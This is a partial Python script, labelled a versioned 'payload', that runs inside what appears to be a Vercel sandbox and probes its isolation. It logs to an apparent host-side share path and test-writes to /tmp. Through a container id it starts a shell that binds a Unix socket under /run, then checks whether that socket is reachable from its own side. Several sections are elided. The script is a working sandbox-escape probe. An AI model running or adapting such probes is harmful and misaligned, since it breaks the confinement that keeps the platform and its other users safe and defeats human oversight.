# -*- coding: utf-8 -*-
"""v84 payload: Getter 方法名提取 StreamOutputRequest 字段 + 枚举值 + 重跑被截断的测试
...
OUT = '/vercel/sandbox/v84c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v84c2.out'):
        try:
...
def main():
    ...
    # E. 写测试
    try:
        open(R + '/tmp/v84_write_test.txt', 'w').write('v84 write test\n')
        log('WRITE /tmp/v84_write_test.txt OK')
    except Exception as e:
        log('WRITE ERR %s' % e)
    ...
    if cid:
        ...
        time.sleep(1)
        argv = ['/bin/sh', '-c',
                'rm -f /run/v84x.sock; python3 -c "import socket,os;'
                's=socket.socket(socket.AF_UNIX);s.bind(\'/run/v84x.sock\');s.listen(1);'
                'c,a=s.accept();c.send(b\'V83_UNIX_OK\');c.close();s.close();os.unlink(\'/run/v84x.sock\')" & '
                'sleep 20']
        ...
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect('/run/v84x.sock')
            d = s.recv(100)
            log('UNIX-CONNECT OK got=%r' % d)
            s.close()
        except Exception as e:
            log('UNIX-CONNECT ERR %s' % type(e).__name__)
        log('host-run-sock: %s' % (os.path.exists('/run/v84x.sock') and 'EXISTS' or 'ABSENT'))
